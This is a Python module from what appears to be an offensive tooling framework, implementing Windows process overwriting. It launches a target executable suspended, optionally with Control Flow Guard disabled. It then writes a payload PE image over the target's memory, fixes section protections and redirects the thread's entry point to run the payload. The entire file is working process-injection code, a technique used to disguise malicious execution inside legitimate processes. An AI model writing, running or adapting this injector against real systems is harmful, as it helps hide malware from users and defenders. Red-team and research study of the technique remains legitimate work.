########################################################
### PSOverwrite Module
### Status: untested
########################################################

import ctypes
import ctypes.wintypes
from utils.helper import nstate as nstate
from utils.windef import *
from utils.winconst import *

CATEGORY = 'inject'

def register_arguments(parser):
            parser.add_argument('-p', '--payload', type=str, required=True, help='Payload, which overwrites the target')
            parser.add_argument('-t', '--target', type=str, required=True, help='Target process, to overwrite')
            parser.add_argument('-n', '--nocfg', action='store_true', default=False, required=False, help='Create the process with CFGuard disabled')

class STARTUPINFOEX(ctypes.Structure):
    _fields_ = [
        ("StartupInfo", STARTUPINFO),
        ("lpAttributeList", LPVOID)
    ]

class module:
        Author = 'psycore8'
        Description = 'Process_Overwrite Module, depends on https://github.com/hasherezade/process_overwriting'
        Version = '0.1.3'
        DisplayName = 'PROCESS-OVERWRITE'
        pid = 0
        attr_list = any
        import pefile
        import os   

        def __init__(self, target, payload, nocfg=bool):
              self.target = target
              self.payload = payload
              self.nocfg = nocfg
        
        def msg(self, message_type, MsgVar=None, ErrorExit=False):
            messages = {
                    'pre.head'         : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
                    'create.cfg'       : f'{nstate.f_out} CFGuard mitigation will be applied!',
                    'create.try'       : f'{nstate.s_note} Create suspended Process...',
                    'create.error'     : f'{nstate.s_fail} CreateProcess failed',
                    'create.success'   : f'{nstate.s_ok} CreateProcess successful! PID: {MsgVar}',
                    'size.error'       : f'{nstate.s_fail} The payload is too big to fit in target!',
                    'arg.error'        : f'{nstate.s_fail} One of the given arguments are not valid!',
                    'base.success'     : f'{nstate.f_out} Base address found: {MsgVar}',
                    'base.error'       : f'{nstate.s_fail} Base address NOT found',
                    'target.try'       : f'{nstate.s_note} Processing target image',
                    'target.success'   : f'{nstate.s_ok} Target {MsgVar}',
                    'payload.try'      : f'{nstate.s_note} Processing payload image',
                    'payload.success'  : f'{nstate.s_ok} Payload {MsgVar}',
                    'pe.map'           : f'{nstate.s_note} Mapping memory image',
                    'pe.pad'           : f'{nstate.f_out} Padding image to target size, adding {MsgVar} bytes',
                    'prot_img'         : f'{nstate.s_note} Set memory to PAGE_READWRITE',
                    'write.try'        : f'{nstate.s_note} Writing to process memory',
                    'write.success'    : f'{nstate.s_ok} {MsgVar} bytes written to target process',
                    'sec.try'          : f'{nstate.s_note} Set section protections',
                    'ep.success'       : f'{nstate.f_out} Entry point is {MsgVar}',
                    'tc.try'           : f'{nstate.s_note} Redirecting code flow to new entry point',
                    'tc.success'       : f'{nstate.f_out} RCX value changed to {MsgVar}',
                    'thread.success'   : f'{nstate.s_note} ResumeThread PID: {MsgVar}',
                    'error'            : f'{nstate.s_fail} Error: {ctypes.get_last_error()}',
                    'post.done'        : f'{nstate.s_ok} DONE!'
            }
            print(messages.get(message_type, f'{message_type} - this message type is unknown'))
            if ErrorExit:
             exit()
                
        def get_remote_base_address(self, hp):
            class PEB(ctypes.Structure):
                _fields_ = [
                    ("Reserved1", BYTE * 2),
                    ("BeingDebugged", BYTE),
                    ("Reserved2", BYTE),
                    ("Reserved3", BYTE * 2),
                    ("Ldr", BYTE), 
                    ("ProcessParameters", BYTE),
                    ("Reserved4", BYTE * 3),
                    ("AtlThunkSListPtr", BYTE),
                    ("Reserved5", BYTE),
                    ("Reserved6", BYTE),
                    ("Reserved7", BYTE),
                    ("ImageBaseAddress", LPCVOID) 
                ]
            class PROCESS_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("Reserved1", LPVOID),
                    ("PebBaseAddress", LPCVOID),
                    ("Reserved2", LPVOID * 4)
                ]
            pbi = PROCESS_BASIC_INFORMATION()
            status = ntdll.NtQueryInformationProcess(hp, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
            
            if status != 0:
                print(f"NtQueryInformationProcess error: {ctypes.get_last_error()}")
                kernel32.CloseHandle(hp)
                return None

            peb_address = LPCVOID(pbi.PebBaseAddress)
            peb = PEB()
            if not kernel32.ReadProcessMemory(hp, peb_address, ctypes.byref(peb), ctypes.sizeof(peb), None):
                print(f"ReadProcessMemory error: {ctypes.get_last_error()}")
                kernel32.CloseHandle(hp)
                return None
            return peb.ImageBaseAddress
        
        def translate_protect(self, sec_charact):
            B = hex(sec_charact)[2:3]
            if B == 'E': #EXECUTE_READ_WRITE
                return PAGE_EXECUTE_READWRITE
            if B == '6': # EXECUTE_READ
                return PAGE_EXECUTE_READ
            if B == '2': # EXECUTE
                return PAGE_EXECUTE_READ
            if B == 'C': # READ_WRITE
                return PAGE_READWRITE
            if B == '4': # READ
                return PAGE_READONLY

            return PAGE_READWRITE
        
        def set_section_access(self, hProcess, base_address, pe_implant, image_size_target):
            op = USHORT(0)
            status = VirtualProtectEx(hProcess, base_address, PAGE_SIZE, PAGE_READONLY, op)
            for section in pe_implant.sections:
                sec_protect = self.translate_protect( section.Characteristics )
                sec_offset_va = section.VirtualAddress
                next_sec_va = base_address + sec_offset_va
                protect_size = image_size_target - sec_offset_va
                status = VirtualProtectEx(hProcess, next_sec_va, protect_size, sec_protect, op)
                if status != 0:
                     pass
                else:
                    print(f'VirtualProtectEx error: {ctypes.get_last_error()}')

        def create_nocfg_attributes(self, siex):
            ctypes.memset(ctypes.byref(siex), 0, ctypes.sizeof(STARTUPINFOEX))
            siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
            
            cbAttributeListSize = ctypes.c_size_t(0)
            MitgFlags = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
            
            kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(cbAttributeListSize))
            if not cbAttributeListSize.value:
                print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
                return False
            
            buffer = ctypes.create_string_buffer(cbAttributeListSize.value)            
            if not kernel32.InitializeProcThreadAttributeList(buffer, 1, 0, ctypes.byref(cbAttributeListSize)):
                print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
                siex.lpAttributeList = None
                return False
            
            if not kernel32.UpdateProcThreadAttribute(buffer, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(MitgFlags), ctypes.sizeof(MitgFlags), None, None):
                print(f"UpdateProcThreadAttribute failed: {kernel32.GetLastError():#x}")
                return False
            kernel32.DeleteProcThreadAttributeList(buffer)
            
            self.attr_list = buffer
            return True
        
        def free_nocfg_attributes(siex):
            if siex.lpAttributeList:
                kernel32.DeleteProcThreadAttributeList(siex.lpAttributeList)
                kernel32.HeapFree(kernel32.GetProcessHeap(), 0, siex.lpAttributeList)
                siex.lpAttributeList = None
                     
        def process(self):
            m = self.msg
            m('pre.head')
            LPPROC_THREAD_ATTRIBUTE_LIST = LPVOID
            siex = STARTUPINFOEX()
            bytes_written = SIZE_T()
            context = CONTEXT()
            oldprotect = USHORT(0)
            si = STARTUPINFO()
            pi = PROCESS_INFORMATION()

            if not (self.os.path.exists(self.target) and self.os.path.exists(self.payload)):
                 m('arg.error', None, True)

            siex = STARTUPINFOEX()
            process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE

            if self.nocfg:
                m('create.cfg')
                process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT
                if not self.create_nocfg_attributes(siex):
                    self.free_nocfg_attributes(siex)
                    m('error')
                si = siex.StartupInfo
                si.cb = ctypes.sizeof(siex)
                siex.lpAttributeList = ctypes.cast(self.attr_list, LPPROC_THREAD_ATTRIBUTE_LIST)

            m('create.try')
            success = CreateProcess(None, self.target, None, None, False, process_flags, None, None, ctypes.byref(si), ctypes.byref(pi))
            if not success:
                m('error')
                m('create.error', None, True)

            m('create.success', pi.dwProcessId)

            base_address = self.get_remote_base_address(pi.hProcess)
            if base_address:
                 m('base.success', hex(base_address))
            else:
                m('base.error', None, True)
                exit()

            m('target.try')
            pe_target = self.pefile.PE(self.target)
            target_image_size = pe_target.OPTIONAL_HEADER.SizeOfImage
            target_img_base = pe_target.OPTIONAL_HEADER.ImageBase
            target_info = f'image base: {hex(target_img_base)} - Size: {target_image_size}'
            m('target.success', target_info)

            m('payload.try')
            pe_payl = self.pefile.PE(self.payload)
            payload_img_base = pe_payl.OPTIONAL_HEADER.ImageBase
            payload_image_size = pe_payl.OPTIONAL_HEADER.SizeOfImage

            payload_info = f'image base: {hex(payload_img_base)} - Size: {payload_image_size}'
            m('payload.success', payload_info)

            if payload_image_size > target_image_size:
                 m('size.error', None, True)

            m('pe.map')
            pe_module = pe_payl.get_memory_mapped_image()

            ### fill payload PE image with 00
            padding_bytes = target_image_size - len(pe_module)
            m('pe.pad', padding_bytes)
            padding = (target_image_size - len(pe_module)) * b'\x00'
            padded_payl = pe_module + padding

            status = VirtualProtectEx(pi.hProcess, base_address, target_image_size, PAGE_READWRITE, oldprotect)

            m('write.try')
            if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, target_image_size, ctypes.byref(bytes_written)):
                 raise Exception(f"WriteProcessMemory error: {ctypes.get_last_error()}")

            m('write.success', bytes_written.value)
            self.set_section_access(pi.hProcess, base_address, pe_payl, target_image_size)
            entry_point_rva = pe_payl.OPTIONAL_HEADER.AddressOfEntryPoint
            entry_point = base_address + entry_point_rva
            m('ep.success', hex(entry_point))

            m('tc.try')
            context.ContextFlags = 0x10007  # CONTEXT_FULL
            status = GetThreadContext(pi.hThread, ctypes.byref(context))
            if status == 0:
                 raise Exception(f"GetThreadCntext error: {ctypes.get_last_error()}")

            context.Rcx = entry_point
            status = SetThreadContext(pi.hThread, ctypes.byref(context))
            if status == 0:
                 raise Exception(f"SetThreadCntext error: {ctypes.get_last_error()}")
            else:
                 m('tc.success', hex(entry_point))

            m('thread.success', pi.dwProcessId)
            ResumeThread(pi.hThread)

            CloseHandle(pi.hThread)
            CloseHandle(pi.hProcess)
            m('post.done')
